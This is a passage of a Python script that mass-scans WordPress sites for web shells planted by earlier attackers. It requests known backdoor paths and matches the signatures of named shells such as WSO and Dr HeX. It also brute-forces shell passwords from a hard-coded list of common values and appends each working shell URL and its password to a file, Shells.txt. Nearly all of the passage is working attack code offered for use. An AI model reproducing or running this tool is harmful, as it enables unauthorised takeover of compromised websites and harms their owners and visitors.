																											if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																												print(' # '+site +'/ --> {}[protostar]'.format(fg))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH19_J+'#r00t')
																											else :
																												padmin = requests.post(SH19_J,data=password_admin,timeout=15).content
																												if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																													print(' # '+site +'/ --> {}[protostar]'.format(fg))
																													with open('Shells.txt', mode='a') as d:
																														d.write(SH19_J+'#admin')
																												else :
																													pt00r = requests.post(SH19_J,data=password_t00r,timeout=15).content
																													if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																														print(' # '+site +'/ --> {}[protostar]'.format(fg))
																														with open('Shells.txt', mode='a') as d:
																															d.write(SH19_J+'#t00r')
																													else :
																														p123 = requests.post(SH19_J,data=password_123,timeout=15).content
																														if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																															print(' # '+site +'/ --> {}[protostar]'.format(fg))
																															with open('Shells.txt', mode='a') as d:
																																d.write(SH19_J+'#123')
																														else :
																															p1234 = requests.post(SH19_J,data=password_1234,timeout=15).content
																															if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																																print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																with open('Shells.txt', mode='a') as d:
																																	d.write(SH19_J+'#1234')
																															else :
																																p12345 = requests.post(SH19_J,data=password_12345,timeout=15).content
																																if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																																	print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																	with open('Shells.txt', mode='a') as d:
																																		d.write(SH19_J+'#12345')
																																else :
																																	p123456 = requests.post(SH19_J,data=password_123456,timeout=15).content
																																	if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																																		print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																		with open('Shells.txt', mode='a') as d:
																																			d.write(SH19_J+'#123456')
																																	else :
																																		p123123 = requests.post(SH19_J,data=password_123123,timeout=15).content
																																		if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																																			print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																			with open('Shells.txt', mode='a') as d:
																																				d.write(SH19_J+'#123123')
																																		else :
																																			p123321 = requests.post(SH19_J,data=password_123321,timeout=15).content
																																			if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																																				print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																				with open('Shells.txt', mode='a') as d:
																																					d.write(SH19_J+'#123321')
																																			else :
																																				p123456789 = requests.post(SH19_J,data=password_123456789,timeout=15).content
																																				if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																																					print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																					with open('Shells.txt', mode='a') as d:
																																						d.write(SH19_J+'#123456789')
																																				else :
																																					p1234567890 = requests.post(SH19_J,data=password_1234567890,timeout=15).content
																																					if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																																						print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																						with open('Shells.txt', mode='a') as d:
																																							d.write(SH19_J+'#1234567890')
																																					else :
																																						phaurgeulis = requests.post(SH19_J,data=password_haurgeulis,timeout=15).content
																																						if 'Andela1C3' in phaurgeulis  :
																																							print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																							with open('Shells.txt', mode='a') as d:
																																								d.write(SH19_J+'#haurgeulis')
																																						else :
																																							print(' # '+site +' --> {}[Failed]'.format(fr))
																								else :
																									SH20_J_content = requests.get(SH20_J,timeout=15).content
																									if ' type="file"' in SH20_J_content or ' type=\'file\'' in SH20_J_content or ' type= "file"' in SH20_J_content or ' type= \'file\'' in SH20_J_content or ' type = "file"' in SH20_J_content or ' type = \'file\'' in SH20_J_content or ' type ="file"' in SH20_J_content or ' type =\'file\'' in SH20_J_content or ' type=file' in SH20_J_content or ' type =file' in SH20_J_content or ' type= file' in SH20_J_content or ' type = file' in SH20_J_content or 'Upload</a> ]</li><li>[' in SH20_J_content or 'upload</a><li><a>Sym' in SH20_J_content :
																										print(' # '+site +'/ --> {}[atomic]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH20_J+'')
																									elif ' name=pass' in SH20_J_content :
																										nhzgrf = requests.post(SH20_J,data=password_nhzgrf,timeout=15).content
																										if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
																											print(' # '+site +'/ --> {}[atomic]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH20_J+'#nhzgrf')
																										else :
																											proot = requests.post(SH20_J,data=password_root,timeout=15).content
																											if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																												print(' # '+site +'/ --> {}[atomic]'.format(fg))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH20_J+'#root')
																											else :
																												pr00t = requests.post(SH20_J,data=password_r00t,timeout=15).content
																												if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																													print(' # '+site +'/ --> {}[atomic]'.format(fg))
																													with open('Shells.txt', mode='a') as d:
																														d.write(SH20_J+'#r00t')
																												else :
																													padmin = requests.post(SH20_J,data=password_admin,timeout=15).content
																													if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																														print(' # '+site +'/ --> {}[atomic]'.format(fg))
																														with open('Shells.txt', mode='a') as d:
																															d.write(SH20_J+'#admin')
																													else :
																														pt00r = requests.post(SH20_J,data=password_t00r,timeout=15).content
																														if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																															print(' # '+site +'/ --> {}[atomic]'.format(fg))
																															with open('Shells.txt', mode='a') as d:
																																d.write(SH20_J+'#t00r')
																														else :
																															p123 = requests.post(SH20_J,data=password_123,timeout=15).content
																															if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																																print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																with open('Shells.txt', mode='a') as d:
																																	d.write(SH20_J+'#123')
																															else :
																																p1234 = requests.post(SH20_J,data=password_1234,timeout=15).content
																																if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																																	print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																	with open('Shells.txt', mode='a') as d:
																																		d.write(SH20_J+'#1234')
																																else :
																																	p12345 = requests.post(SH20_J,data=password_12345,timeout=15).content
																																	if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																																		print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																		with open('Shells.txt', mode='a') as d:
																																			d.write(SH20_J+'#12345')
																																	else :
																																		p123456 = requests.post(SH20_J,data=password_123456,timeout=15).content
																																		if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																																			print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																			with open('Shells.txt', mode='a') as d:
																																				d.write(SH20_J+'#123456')
																																		else :
																																			p123123 = requests.post(SH20_J,data=password_123123,timeout=15).content
																																			if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																																				print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																				with open('Shells.txt', mode='a') as d:
																																					d.write(SH20_J+'#123123')
																																			else :
																																				p123321 = requests.post(SH20_J,data=password_123321,timeout=15).content
																																				if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																																					print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																					with open('Shells.txt', mode='a') as d:
																																						d.write(SH20_J+'#123321')
																																				else :
																																					p123456789 = requests.post(SH20_J,data=password_123456789,timeout=15).content
																																					if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																																						print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																						with open('Shells.txt', mode='a') as d:
																																							d.write(SH20_J+'#123456789')
																																					else :
																																						p1234567890 = requests.post(SH20_J,data=password_1234567890,timeout=15).content
																																						if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																																							print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																							with open('Shells.txt', mode='a') as d:
																																								d.write(SH20_J+'#1234567890')
																																						else :
																																							phaurgeulis = requests.post(SH20_J,data=password_haurgeulis,timeout=15).content
																																							if 'Andela1C3' in phaurgeulis  :
																																								print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																								with open('Shells.txt', mode='a') as d:
																																									d.write(SH20_J+'#haurgeulis')
																																							else :
																																								print(' # '+site +' --> {}[Failed]'.format(fr))
																									else :
																										SH21_J_content = requests.get(SH21_J,timeout=15).content
																										if ' type="file"' in SH21_J_content or ' type=\'file\'' in SH21_J_content or ' type= "file"' in SH21_J_content or ' type= \'file\'' in SH21_J_content or ' type = "file"' in SH21_J_content or ' type = \'file\'' in SH21_J_content or ' type ="file"' in SH21_J_content or ' type =\'file\'' in SH21_J_content or ' type=file' in SH21_J_content or ' type =file' in SH21_J_content or ' type= file' in SH21_J_content or ' type = file' in SH21_J_content or 'Upload</a> ]</li><li>[' in SH21_J_content or 'upload</a><li><a>Sym' in SH21_J_content :
																											print(' # '+site +'/ --> {}[atomic]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH21_J+'')
																										elif ' name=pass' in SH21_J_content :
																											nhzgrf = requests.post(SH21_J,data=password_nhzgrf,timeout=15).content
																											if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
																												print(' # '+site +'/ --> {}[atomic]'.format(fg))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH21_J+'#nhzgrf')
																											else :
																												proot = requests.post(SH21_J,data=password_root,timeout=15).content
																												if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																													print(' # '+site +'/ --> {}[atomic]'.format(fg))
																													with open('Shells.txt', mode='a') as d:
																														d.write(SH21_J+'#root')
																												else :
																													pr00t = requests.post(SH21_J,data=password_r00t,timeout=15).content
																													if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																														print(' # '+site +'/ --> {}[atomic]'.format(fg))
																														with open('Shells.txt', mode='a') as d:
																															d.write(SH21_J+'#r00t')
																													else :
																														padmin = requests.post(SH21_J,data=password_admin,timeout=15).content
																														if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																															print(' # '+site +'/ --> {}[atomic]'.format(fg))
																															with open('Shells.txt', mode='a') as d:
																																d.write(SH21_J+'#admin')
																														else :
																															pt00r = requests.post(SH21_J,data=password_t00r,timeout=15).content
																															if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																																print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																with open('Shells.txt', mode='a') as d:
																																	d.write(SH21_J+'#t00r')
																															else :
																																p123 = requests.post(SH21_J,data=password_123,timeout=15).content
																																if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																																	print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																	with open('Shells.txt', mode='a') as d:
																																		d.write(SH21_J+'#123')
																																else :
																																	p1234 = requests.post(SH21_J,data=password_1234,timeout=15).content
																																	if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																																		print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																		with open('Shells.txt', mode='a') as d:
																																			d.write(SH21_J+'#1234')
																																	else :
																																		p12345 = requests.post(SH21_J,data=password_12345,timeout=15).content
																																		if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																																			print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																			with open('Shells.txt', mode='a') as d:
																																				d.write(SH21_J+'#12345')
																																		else :
																																			p123456 = requests.post(SH21_J,data=password_123456,timeout=15).content
																																			if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																																				print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																				with open('Shells.txt', mode='a') as d:
																																					d.write(SH21_J+'#123456')
																																			else :
																																				p123123 = requests.post(SH21_J,data=password_123123,timeout=15).content
																																				if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																																					print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																					with open('Shells.txt', mode='a') as d:
																																						d.write(SH21_J+'#123123')
																																				else :
																																					p123321 = requests.post(SH21_J,data=password_123321,timeout=15).content
																																					if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																																						print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																						with open('Shells.txt', mode='a') as d:
																																							d.write(SH21_J+'#123321')
																																					else :
																																						p123456789 = requests.post(SH21_J,data=password_123456789,timeout=15).content
																																						if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																																							print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																							with open('Shells.txt', mode='a') as d:
																																								d.write(SH21_J+'#123456789')
																																						else :
																																							p1234567890 = requests.post(SH21_J,data=password_1234567890,timeout=15).content
																																							if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																																								print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																								with open('Shells.txt', mode='a') as d:
																																									d.write(SH21_J+'#1234567890')
																																							else :
																																								phaurgeulis = requests.post(SH21_J,data=password_haurgeulis,timeout=15).content
																																								if 'Andela1C3' in phaurgeulis  :
																																									print(' # '+site +'/ --> {}[atomic]'.format(fg))
																																									with open('Shells.txt', mode='a') as d:
																																										d.write(SH21_J+'#haurgeulis')
																																								else :
																																									print(' # '+site +' --> {}[Failed]'.format(fr))
																										else :
																											print(' # '+site +' --> {}[Failed]'.format(fr))
	except : 
		print(' # '+site +' --> {}[Failed]'.format(fr))

		
def WordPress2(site):
	try:
		site = URL(site)
		now = datetime.datetime.now()
		year = str(now.year)
		month = str(now.month)
		if '10' in month or '11' in month or '12' in month :
			month = month
		else :
			month = '0'+month

		pattern_php = re.compile('<a href="(.*).php">')	
		pattern_phtml = re.compile('<a href="(.*).phtml">')	
		
		SH14 = site+'/shell.php'
		SH16 = site+'/wp-admin/network/wp-footer.php'
		SH17 = site+'/wp-info.php'
		SH18 = site+'/wp-content/vuln.php'
		SH20 = site+'/up.php'
		SH21 = site+'/upload.php'
		SH22 = site+'/upel.php'
		SH23 = site+'/wp-content/uploads/'
		SH24 = site+'/wp-content/uploads/'+year+'/'+month+'/'
		SH25 = site+'/license.php'
		SH26 = site+'/wp-content/plugins/ppus/up.php'
		SH27 = site+'/098.php'
		SH28 = site+'/V5.php'
		SH29 = site+'/new_license.php'		
		SH30 = site+'/wp-content/plugins/theme-configurator/mini.php'
		SH31 = site+'/wp-content/plugins/widget-logic/mini.php'		
		
		try :
			site_check = requests.get(site+'/',timeout=15).content
			up_check = requests.get(SH20,timeout=15).content
			upload_check = requests.get(SH21,timeout=15).content
			SH23_check = requests.get(SH23,timeout=15).content
			SH24_check = requests.get(SH24,timeout=15).content
			shell_check = requests.get(SH14,timeout=15).content
		except :
			pass
		password_nhzgrf = {'pass':'nhzgrf'}
		password_root = {'pass':'root'}
		password_r00t = {'pass':'r00t'}
		password_admin = {'pass':'admin'}
		password_t00r = {'pass':'t00r'}
		password_123 = {'pass':'123'}
		password_1234 = {'pass':'1234'}
		password_12345 = {'pass':'12345'}
		password_123456 = {'pass':'123456'}
		password_123123 = {'pass':'123123'}
		password_123321 = {'pass':'123321'}
		password_123456789 = {'pass':'123456789'}
		password_1234567890 = {'pass':'1234567890'}
		password_haurgeulis = {'pass':'haurgeulis'}
		password_rehan = {'password':'rehan'}

		if 'Windows' in shell_check and 'Upload file:' in shell_check :
			print(' # '+site +'/ --> {}[Succeeded]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH14+'')		
		elif 'iCloud1337 private shell' in requests.get(SH16,timeout=15).content :	
			print(' # '+site +'/ --> {}[iCloud1337]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH16+'')
		elif 'Copyright 2017 | ErrOr SquaD All Rights Reserved.' in requests.get(SH17,timeout=15).content :	
			print(' # '+site +'/ --> {}[ErrOrSquaD]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH17+'#1232')
		elif 'Vuln!! patch it Now!' in requests.get(SH18,timeout=15).content :	
			print(' # '+site +'/ --> {}[ExploitJok3r]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH18+'')
		elif 'Vuln!! patch it Now!' in requests.get(SH22,timeout=15).content :	
			print(' # '+site +'/ --> {}[ExploitJok3r]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH22+'')
		elif 'http://i.imgur.com/kkhH5Ig.png' in requests.get(SH26,timeout=15).content :
			print(' # '+site +'/ --> {}[PPUS]'.format(fg))
			if 'SuramSh3ll' in requests.get(site+'/wp-content/plugins/ppus/suram.php',timeout=15).content :
				with open('Shells.txt', mode='a') as d:
					d.write(SH26+' | '+site+'/wp-content/plugins/ppus/suram.php')
			else :		
				with open('Shells.txt', mode='a') as d:
					d.write(SH26+'')
		elif 'WSO 2.6' in requests.get(SH27,timeout=15).content :	
			print(' # '+site +'/ --> {}[WSO]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH27+'')
		elif 'Dr HeX' in requests.get(SH28,timeout=15).content :	
			print(' # '+site +'/ --> {}[DrHeX]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH28+'#kinghex')
		elif '<title>File</title>' in requests.get(SH29,timeout=15).content :	
			print(' # '+site +'/ --> {}[License]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH29+'')
		elif 'U7TiM4T3_H4x0R Plugin' in requests.get(SH30,timeout=15).content :	
			print(' # '+site +'/ --> {}[U7TiM4T3]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH30+'')
		elif 'U7TiM4T3_H4x0R Plugin' in requests.get(SH31,timeout=15).content :	
			print(' # '+site +'/ --> {}[U7TiM4T3]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH31+'')						
		elif 'Index of' in SH23_check and '.php' in SH23_check :
			shells = []
			if re.findall(pattern_php,SH23_check):
				shells = re.findall(pattern_php,SH23_check)			
			for shell in shells:
				sh_check = requests.get(SH23+shell+'.php',timeout=15).content
				if ' type="file"' in sh_check or ' type=\'file\'' in sh_check or ' type= "file"' in sh_check or ' type= \'file\'' in sh_check or ' type = "file"' in sh_check or ' type = \'file\'' in sh_check or ' type ="file"' in sh_check or ' type =\'file\'' in sh_check or ' type=file' in sh_check or ' type =file' in sh_check or ' type= file' in sh_check or ' type = file' in sh_check or 'Upload</a> ]</li><li>[' in sh_check or 'upload</a><li><a>Sym' in sh_check :
					print(' # '+site +'/ --> {}[Vuln]'.format(fg))
					with open('Shells.txt', mode='a') as d:
						d.write(SH23+shell+'.php')
				elif ' name=pass' in sh_check :
					nhzgrf = requests.post(SH23+shell+'.php',data=password_nhzgrf,timeout=15).content
					if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
						print(' # '+site +'/ --> {}[Vuln]'.format(fg))
						with open('Shells.txt', mode='a') as d:
							d.write(SH23+shell+'.php'+'#nhzgrf')
					else :
						proot = requests.post(SH23+shell+'.php',data=password_root,timeout=15).content
						if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
							print(' # '+site +'/ --> {}[Vuln]'.format(fg))
							with open('Shells.txt', mode='a') as d:
								d.write(SH23+shell+'.php'+'#root')
						else :
